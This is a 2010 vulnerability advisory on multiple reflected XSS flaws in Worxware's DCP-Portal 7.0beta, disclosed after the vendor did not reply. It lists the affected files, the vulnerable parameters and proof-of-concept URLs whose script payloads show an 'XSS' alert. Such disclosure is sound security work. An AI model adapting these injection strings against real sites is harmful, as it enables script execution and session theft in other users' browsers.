
Title: DCP-Portal Multiple XSS Vulnerabilities
Vendor: Worxware
Product: DCP-Portal
Tested Version: 7.0beta
Threat Class: XSS
Severity: High
Remote: yes
Local: no
Discovered By: Andrei Rimsa Alvares

===== Description =====

Multiple XSS vulnerabilities found in the DCP-Portal.

1. common/components/editor/insert_image.php, modules/newsletter/insert_image.php, php/editor.php
  The variable $upload_failure_report gets user input from http get request variable "Image" when the action of deleting an uploaded file fails. Later this variable is outputted to the page without proper sanitization.

2. modules/gallery/view_img.php
  Page title can be modified by changing the http request variable "imgtitle". Since no sanitizer is used, an XSS occurs on line 2.
  Another vulnerability exists if magic quotes is turned off. The http request variable "imagename" gets outputted on the java script function document.write between simple quotes on line 27.

3. modules/tips/show_tip.php
  Http request variable "newsId" gets outputted to the page without proper sanitization on line 14.

===== Impact =====

Malicious java script code can be executed in the context of the affected web site.

===== Proof of Concept =====

All proof of concepts display a java script alert containing the message "XSS".

1. common/components/editor/insert_image.php, modules/newsletter/insert_image.php, php/editor.php
  http://target/common/components/editor/insert_image.php?MyAction=Delete&Image=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
  http://target/modules/newsletter/insert_image.php?MyAction=Delete&Image=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
  http://target/php/editor.php?MyAction=Delete&Image=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E

2. modules/gallery/view_img.php
  http://target/modules/gallery/view_img.php?imgtitle=%3C/title%3E%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
  (requires magic_quotes_gpc = off) http://target/modules/gallery/view_img.php?imagename=%22');window.alert('XSS');document.write('%22

3. modules/tips/show_tip.php
  http://target/modules/tips/show_tip.php?newsId=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E

===== Workaround =====

No workaround available at the time.

===== Disclosure Timeline =====

June, 16 2010 - Vendor notification.
July, 07 2010 - No vendor reply. Public disclosure.

===== References =====

http://www.dcp-portal.org
http://www.worxware.com 		 	   		  
_________________________________________________________________
Hotmail: Trusted email with powerful SPAM protection.
https://signup.live.com/signup.aspx?id=60969
